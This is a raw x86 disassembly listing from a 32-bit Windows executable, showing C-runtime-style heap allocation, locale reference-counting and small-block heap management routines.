  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
